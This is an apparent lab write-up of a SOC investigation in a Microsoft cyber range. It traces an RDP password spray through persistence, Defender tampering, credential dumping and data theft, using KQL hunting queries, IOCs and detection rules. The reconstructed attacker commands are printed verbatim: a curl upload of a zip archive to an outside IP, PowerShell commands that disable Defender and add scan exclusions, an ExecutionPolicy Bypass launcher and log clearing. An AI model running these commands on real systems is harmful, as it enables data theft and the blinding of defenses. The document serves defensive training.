# SOC Investigation: VM Compromise via RDP Password Spray — Full Attack Chain Reconstruction

> **"Suspicious activity detected on a cloud-hosted Windows VM. Multiple failed RDP attempts followed by a successful login. The attacker established persistence, dumped credentials, and exfiltrated data before clearing their tracks."**

[![Platform](https://img.shields.io/badge/Platform-Microsoft%20Sentinel%20%7C%20MDE-0078D4?logo=microsoftazure&logoColor=white)](https://azure.microsoft.com)
[![Language](https://img.shields.io/badge/Query%20Language-KQL-orange)](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)
[![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red)](https://attack.mitre.org/)
[![Flags](https://img.shields.io/badge/Flags%20Identified-10%2F10-brightgreen)](https://github.com)

<img width="988" height="655" alt="image" src="https://github.com/user-attachments/assets/c9f6cab6-eb3f-42b1-a802-9f5b4490ef24" />


---

## Incident Brief

| | |
|---|---|
| **Environment** | Cloud-hosted Windows VM — Microsoft Cyber Range |
| **Compromised Host** | `slflarewinsysmo` |
| **Evidence Source** | MDE telemetry forwarded to Microsoft Sentinel |
| **Investigation Window** | 2025-09-16 to 2025-09-27 |
| **Attack Duration** | ~35 minutes (initial session) + return visit 11 days later |
| **Outcome** | Full attack chain reconstructed across 10 flags — initial access through data exfiltration confirmed |

---

## Scenario


Suspicious RDP login activity was detected on a cloud-hosted Windows server. The SOC received an alert indicating multiple failed authentication attempts followed by a successful login from an external IP address. As the assigned analyst, the objective was to determine how the attacker got in, what they did once inside, and whether they still had access.

**Investigation Questions:**
- How did the attacker authenticate?
- Which account was compromised?
- What tools were executed and where were they staged?
- How was persistence established?
- What defenses were modified?
- What data was collected and how was it exfiltrated?

**Evidence Available:** MDE log tables queried via KQL in Microsoft Sentinel Advanced Hunting — `DeviceLogonEvents`, `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents`, `DeviceRegistryEvents`

---

## Platform and Tools

- Microsoft Sentinel — Advanced Hunting
- Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)
- MITRE ATT&CK Framework for technique mapping

---

## High-Level Investigation Plan

Before writing any queries, I mapped out what I expected to find based on the scenario title — *"Hide Your RDP: Password Spray Leads to Full Compromise"*:

- **`DeviceLogonEvents`** — Find the external RDP source and compromised account
- **`DeviceProcessEvents`** — Identify malicious binaries, execution methods, discovery commands, persistence, credential dumping, and log clearing
- **`DeviceNetworkEvents`** — Find C2 communications and exfiltration traffic
- **`DeviceFileEvents`** — Locate dropped tools and staged archive files
- **`DeviceRegistryEvents`** — Identify Defender configuration tampering and task persistence

---

## Investigation Steps

### Step 1 — Identify the Initial Access Source

**What I was looking for:** External IP addresses that successfully authenticated via RDP after a pattern of failed attempts — the classic indicator of a password spray attack.

My approach was to first get a broad view of all logon events grouped by RemoteIP and ActionType — rather than filtering for a specific IP immediately. This baseline comparison makes anomalies visible instantly.

```kql
DeviceLogonEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where RemoteIP !in ("", "-")
| where ActionType == "LogonSuccess"
| summarize FailedAttempts = count() 
    by RemoteIP, DeviceName, ActionType, AccountName
| sort by FailedAttempts desc
```

![Flag 1 — Authentication Analysis](screenshots/flag_01_auth_analysis.png)

**Finding:** Three IPs appeared. `79.76.123.251` was trying the machine name as a username — automated scanner behavior. `157.180.54.6` was exclusively trying `administrator` — a generic credential list. `159.26.106.84` was different: it specifically targeted the `slflare` account and had 15 successful sessions.

I then confirmed the full login timeline:

```kql
DeviceLogonEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where RemoteIP !in ("", "-")
| sort by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, RemoteIP, ActionType
```

![Flag 2 — Login Timeline](screenshots/flag_02_compromised_account.png)

**Finding:** The sequence was clear — `6:36 PM LogonFailed`, `6:38 PM LogonFailed`, `6:40 PM LogonSuccess`. Two failed attempts before success from `159.26.106.84` targeting `slflare`. This is credential stuffing behavior — not random brute force. The attacker likely had prior knowledge of the username and a short credential list from a previous breach.

> 🚩 **Flag 1 — Attacker IP:** `159.26.106.84`  
> 🚩 **Flag 2 — Compromised Account:** `slflare`
>
> **MITRE:** T1110.001 — Password Guessing | T1078 — Valid Accounts

---

### Step 2 — Identify the Malicious Binary and Execution Method

**What I was looking for:** An executable dropped in a user-writable location shortly after the RDP session started, executed in a way no legitimate user would.

```kql
DeviceProcessEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where AccountName has_any ("slflare", "slflare2", "slflare0", "slflare3")
| where FileName endswith ".exe"
| where FolderPath contains "Public" 
    or FolderPath contains "Temp"
    or FolderPath contains "Downloads"
| sort by TimeGenerated asc
| project AccountName, FileName, FolderPath,
    InitiatingProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessAccountName
```

![Flag 3 — Malicious Binary Discovery](screenshots/flag_03_malicious_binary.png)

**Finding:** `msupdate.exe` in `C:\Users\Public\` at 7:38 PM. Three simultaneous red flags: wrong location (Public folder — world-writable, no admin required), wrong parent (`powershell.exe` spawning an exe from Public is never legitimate), wrong name (`msupdate.exe` mimics Microsoft update tooling but no such legitimate Windows binary exists).

I then retrieved the full command line:

```kql
DeviceProcessEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where AccountName == "slflare"
| where FileName == "msupdate.exe"
| project TimeGenerated, FileName, 
    InitiatingProcessCommandLine,
    ProcessCommandLine
```

![Flag 4 — Command Line Analysis](screenshots/flag_04_command_line.png)

**Finding:** `"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1`

`-ExecutionPolicy Bypass` completely ignores Windows PowerShell script execution policy — `Bypass` is not a policy value, it is a flag that silences all restrictions. Legitimate admins use signed scripts. `-File` reveals that `msupdate.exe` is only a launcher — the real malicious logic lives in `update_check.ps1`.

> 🚩 **Flag 3 — Executed Binary:** `msupdate.exe`  
> 🚩 **Flag 4 — Command Line:** `"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1`
>
> **MITRE:** T1059.001 — PowerShell | T1059.003 — Windows Command Shell | T1036 — Masquerading

---

### Step 3 — Identify Persistence Mechanism

**What I was looking for:** Evidence that the attacker established a mechanism to survive reboots — ensuring their implant would continue running even if the RDP session was terminated.

```kql
DeviceProcessEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where AccountName == "slflare"
| where ProcessCommandLine contains "schtasks"
| sort by TimeGenerated asc
| project AccountName, FileName, FolderPath,
    InitiatingProcessCommandLine
```

![Flag 5 — Scheduled Task Creation](screenshots/flag_05_scheduled_task.png)

**Finding:** Multiple scheduled tasks were created. Names were deliberately chosen to blend with legitimate Windows tasks: `EdgeUpdateTask`, `MicrosoftEdgeUpdateCore`, `WindowsDefenderUpdate`. The last entry — initiated by `"powershell.exe"` — pointed to the attacker's task. Registry evidence confirmed `TaskCache\Tree\MicrosoftUpdateSync` was registered at 7:39 PM, one minute after the C2 beacon. Configured to run hourly under `SYSTEM` — the highest privilege level on Windows.

> 🚩 **Flag 5 — Scheduled Task:** `MicrosoftUpdateSync`
>
> **MITRE:** T1053.005 — Scheduled Task/Job: Scheduled Task

---

### Step 4 — Identify Defense Evasion via Defender Modification

**What I was looking for:** Commands that weakened or disabled Windows Defender — specifically folder exclusions that would allow malware to operate without being scanned.

```kql
DeviceProcessEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where InitiatingProcessFileName == "payload.exe"
| project TimeGenerated, AccountName, FileName,
    ProcessCommandLine
| sort by TimeGenerated asc
```

![Flag 6 — Defender Modification](screenshots/flag_06_defender_evasion.png)

**Finding:** `payload.exe` executed two PowerShell commands in sequence — `Set-MpPreference -DisableRealtimeMonitoring $true` (blind Defender completely) and `Add-MpPreference -ExclusionPath 'C:\Windows\Temp'` (exclude Temp folder from all scans). The exclusion persists independently — even if real-time monitoring is re-enabled by policy, `C:\Windows\Temp` remains unscanned. This is where credential dumps (`debug.dmp`, `sam.hive`) were later stored.

> 🚩 **Flag 6 — Defender Exclusion Path:** `C:\Windows\Temp`
>
> **MITRE:** T1562.001 — Impair Defenses: Disable or Modify Windows Defender

---

### Step 5 — Map Discovery Activity

**What I was looking for:** Built-in Windows enumeration tools used to profile the compromised host — standard post-exploitation reconnaissance before lateral movement.

```kql
DeviceProcessEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where ProcessCommandLine has_any (
    "whoami", "net user", "net localgroup",
    "ipconfig /all", "netstat", "systeminfo",
    "net view", "arp -a", "tasklist"
)
| project Timestamp, DeviceName, AccountName,
    FileName, ProcessCommandLine
| order by Timestamp asc
```

![Flag 7 — Discovery Commands](screenshots/flag_07_discovery.png)

**Finding:** At 7:40 PM — two minutes after the C2 beacon established — `cmd.exe /c systeminfo` executed under `slflare`. The timing is deliberate: the C2 server received the callback and immediately sent the reconnaissance command. `systeminfo` returns OS version, installed hotfixes, domain membership, and network adapter config in one shot. All legitimate Windows tools — antivirus will not flag them. Detection requires behavioral context.

> 🚩 **Flag 7 — Discovery Command:** `"cmd.exe" /c systeminfo`
>
> **MITRE:** T1082 — System Information Discovery

---

### Step 6 — Find the Staged Data Archive

**What I was looking for:** A compressed archive created by the compromised account in a non-standard directory — data packaged and ready for exfiltration.

```kql
DeviceFileEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where ActionType == "FileCreated"
| where FileName endswith ".zip" 
    or FileName endswith ".rar" 
    or FileName endswith ".7z"
| project TimeGenerated, FileName, FolderPath,
    ActionType,
    InitiatingProcessAccountName,
    InitiatingProcessFileName
| sort by TimeGenerated asc
```

![Flag 8 — Archive File Creation](screenshots/flag_08_archive.png)

**Finding:** Several archives appeared. Legitimate ones (`msedge.7z`, `VMAgentLogs.zip`) were created by `system` account via `setup.exe` or `collectguestlogs.exe`. `backup_sync.zip` stood out: created by `slflare` via `powershell.exe` in `C:\Users\SLFlare\AppData\Local\Temp\` at 7:41 PM — exactly two minutes after the C2 beacon. Three signals pointing the same direction.

> 🚩 **Flag 8 — Archive File:** `backup_sync.zip`
>
> **MITRE:** T1560.001 — Archive Collected Data: Local Archiving

---

### Step 7 — Locate the Command & Control Server

**What I was looking for:** The first outbound network connection initiated by the malicious process — the C2 beacon callback.

```kql
DeviceNetworkEvents
| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
| where DeviceName contains "flare"
| where RemoteIPType == "Public"
| where InitiatingProcessFileName has_any (
    "powershell.exe", "cmd.exe",
    "msupdate.exe", "appservice.exe", "payload.exe"
)
| project Timestamp, DeviceName,
    RemoteIP, RemotePort, RemoteUrl,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
| order by Timestamp asc
```

![Flag 9 — C2 Identification](screenshots/flag_09_c2.png)

**Finding:** `185.92.220.87` — raw IP, no domain, port 80, initiated by `msupdate.exe` exactly 23 seconds after execution. That 23-second window is the beacon — malware runs, checks in with home server, waits for instructions. Port 80 (HTTP) chosen to blend with normal web traffic. Other IPs had clear legitimate purposes (Microsoft telemetry, GitHub tool staging, Azure blob). This one did not.

> 🚩 **Flag 9 — C2 IP:** `185.92.220.87`
>
> **MITRE:** T1071.001 — Application Layer Protocol: Web Protocols | T1105 — Ingress Tool Transfer

---

### Step 8 — Confirm Data Exfiltration

**What I was looking for:** Network connections referencing the staged archive file — the moment the data actually left the network.

```kql
DeviceNetworkEvents
| where TimeGenerated > todatetime('2025-09-16T19:41:00.0000000Z')
| where DeviceName contains "flare"
| where InitiatingProcessCommandLine contains "backup_sync"
    or InitiatingProcessFileName contains "backup_sync"
| project Timestamp, RemoteIP, RemotePort, RemoteUrl,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
| order by Timestamp asc
```

![Flag 10 — Exfiltration Confirmation](screenshots/flag_10_exfiltration.png)

**Finding:** `curl -X POST -F "file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip" http://185.92.220.87:8081/upload` — as explicit as it gets. `curl` (a legitimate Windows utility) POST-uploaded the archive to the attacker's server. Same IP as C2 but different port (8081) with a dedicated `/upload` endpoint. HTTP — unencrypted. A network sensor with DPI at egress could have captured the file contents in transit.

> 🚩 **Flag 10 — Exfiltration Destination:** `185.92.220.87:8081`
>
> **MITRE:** T1048.003 — Exfiltration Over Unencrypted Protocol

---

## Complete Attack Timeline

```
Sep 16 · 6:35 PM   Automated scanners hit exposed RDP port
                    79.76.123.251 tries machine name — no result
                    157.180.54.6 tries "administrator" — no result

Sep 16 · 6:36 PM   159.26.106.84 begins targeted spray against "slflare"
Sep 16 · 6:38 PM   Second failed attempt
Sep 16 · 6:40 PM   ✅ Successful RDP login — slflare / 159.26.106.84

Sep 16 · 7:38 PM   msupdate.exe executed from C:\Users\Public\
                    PowerShell parent — ExecutionPolicy Bypass
                    Launches update_check.ps1

Sep 16 · 7:39 PM   C2 beacon → 185.92.220.87:80 (23 seconds post-execution)
                    MicrosoftUpdateSync scheduled task created (SYSTEM, hourly)

Sep 16 · 7:40 PM   cmd.exe /c systeminfo — host profiling
                    whoami /all — privilege enumeration
                    nltest /dclist: — hunting for domain controllers

Sep 16 · 7:41 PM   backup_sync.zip staged in AppData\Local\Temp\
Sep 16 · 7:43 PM   curl POST → backup_sync.zip → 185.92.220.87:8081/upload

─────────────────────────────────── 11 days later ───────────────────────

Sep 27 · 2:59 AM   payload.exe deployed — second attack session
Sep 27 · 2:59 AM   Defender real-time monitoring disabled
                    C:\Windows\Temp added to scan exclusions
Sep 27 · 3:00 AM   LSASS memory dump → debug.dmp (all session hashes)
                    SAM database copied → sam.hive (local account hashes)
                    nltest + net.exe user — further enumeration
Sep 27 · 3:01 AM   wevtutil cl — PowerShell logs cleared
                    MDE telemetry unaffected — already captured
```

---

## Summary of All Findings

| Flag | Category | Finding | MITRE |
|------|----------|---------|-------|
| 1 | Initial Access — Source IP | `159.26.106.84` | T1110.001 |
| 2 | Initial Access — Account | `slflare` | T1078 |
| 3 | Execution — Malicious Binary | `msupdate.exe` | T1204.002 |
| 4 | Execution — Command Line | `"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1` | T1059.001 |
| 5 | Persistence — Scheduled Task | `MicrosoftUpdateSync` | T1053.005 |
| 6 | Defense Evasion — Defender Exclusion | `C:\Windows\Temp` | T1562.001 |
| 7 | Discovery — Recon Command | `"cmd.exe" /c systeminfo` | T1082 |
| 8 | Collection — Archive File | `backup_sync.zip` | T1560.001 |
| 9 | C2 — Server IP | `185.92.220.87` | T1071.001 |
| 10 | Exfiltration — Destination | `185.92.220.87:8081` | T1048.003 |

---

## Indicators of Compromise (IOCs)

**Network**

| IOC | Type | Context |
|-----|------|---------|
| `159.26.106.84` | IP | Attacker source — RDP brute force |
| `185.92.220.87` | IP | C2 server and exfiltration host |
| `185.92.220.87:80` | IP:Port | C2 beacon endpoint |
| `185.92.220.87:8081` | IP:Port | Exfiltration upload endpoint |
| `http://185.92.220.87:8081/upload` | URL | Data exfiltration URL |

**Host**

| IOC | Type | Context |
|-----|------|---------|
| `C:\Users\Public\msupdate.exe` | File | First stage launcher — Masquerading |
| `C:\Users\Public\update_check.ps1` | File | Malicious PowerShell script |
| `C:\Users\Public\appservice.exe` | File | Second stage payload |
| `C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip` | File | Staged exfiltration archive |
| `C:\Users\SLFlare\AppData\Local\Temp\debug.dmp` | File | LSASS memory dump |
| `C:\Users\SLFlare\AppData\Local\Temp\sam.hive` | File | SAM database copy |
| `C:\programdata\exfiltratedata.ps1` | File | Exfiltration automation script |
| `MicrosoftUpdateSync` | Scheduled Task | Hourly persistence — SYSTEM |
| `slflare` | Account | Compromised user account |

---

## Response Actions

**Immediate Containment**
- Isolate `slflarewinsysmo` from the network pending full forensic review
- Block `159.26.106.84` and `185.92.220.87` at firewall and NSG level
- Disable and reset `slflare` account — enforce MFA immediately

**Persistence Removal**
- Delete scheduled task `MicrosoftUpdateSync`
- Remove `C:\Users\Public\msupdate.exe`, `appservice.exe`, `update_check.ps1`
- Remove `C:\programdata\exfiltratedata.ps1`

**Credential Reset**
- Reset all local account passwords — LSASS and SAM were dumped
- Rotate any domain credentials cached on this machine

**Root Cause:** RDP exposed directly to the internet on port 3389 with no IP restriction, no VPN requirement, and no MFA. A valid credential for `slflare` was obtained through prior credential exposure.

---

## What Could Have Stopped This

| Control | Where It Would Have Stopped the Attack |
|---------|---------------------------------------|
| Azure Bastion / JIT VM Access | Initial access — no public RDP port |
| NSG restricting port 3389 | Initial access — attacker IP blocked |
| MFA on RDP | Initial access — valid password alone insufficient |
| UEBA alert on new external IP | Detection at 6:40 PM login |
| Alert on `ExecutionPolicy Bypass` | Execution — flagged before payload ran |
| Alert on any Defender modification | Defense evasion — immediate alert |
| ASR rule — block LSASS access | Credential theft prevented |
| Script Block Logging (Event ID 4104) | `update_check.ps1` content captured |
| Network DLP / egress filtering | curl POST to unknown IP blocked |

---

## Detection Rules

```kql
// Rule 1 — PowerShell spawning executables in user-writable paths
DeviceProcessEvents
| where TimeGenerated > ago(1d)
| where InitiatingProcessFileName =~ "powershell.exe"
| where FileName endswith ".exe"
| where FolderPath has_any ("\\Users\\Public\\", "\\Windows\\Temp\\", "\\AppData\\Local\\Temp\\")
| where FileName !in~ ("MicrosoftEdgeUpdate.exe", "setup.exe", "msiexec.exe")
| project TimeGenerated, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine

// Rule 2 — Any Defender modification
DeviceProcessEvents
| where TimeGenerated > ago(1d)
| where ProcessCommandLine has_any ("DisableRealtimeMonitoring", "Add-MpPreference -ExclusionPath")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine

// Rule 3 — LSASS credential dumping via rundll32
DeviceProcessEvents
| where TimeGenerated > ago(1d)
| where ProcessCommandLine contains "comsvcs.dll"
| where ProcessCommandLine contains "MiniDump"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine

// Rule 4 — Known attacker IOCs
DeviceNetworkEvents
| where TimeGenerated > ago(1d)
| where RemoteIP in ("185.92.220.87", "159.26.106.84")
| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName
```

---

## References

- [MITRE ATT&CK — Enterprise Matrix](https://attack.mitre.org/)
- [T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [T1053.005 — Scheduled Task Persistence](https://attack.mitre.org/techniques/T1053/005/)
- [T1562.001 — Impair Defenses](https://attack.mitre.org/techniques/T1562/001/)
- [T1003.001 — LSASS Memory Dumping](https://attack.mitre.org/techniques/T1003/001/)
- [T1048.003 — Exfiltration Over Unencrypted Protocol](https://attack.mitre.org/techniques/T1048/003/)
- [Microsoft KQL Documentation](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)

---

> *Investigation completed in a Microsoft cyber range environment using Microsoft Sentinel Advanced Hunting and MDE telemetry.*
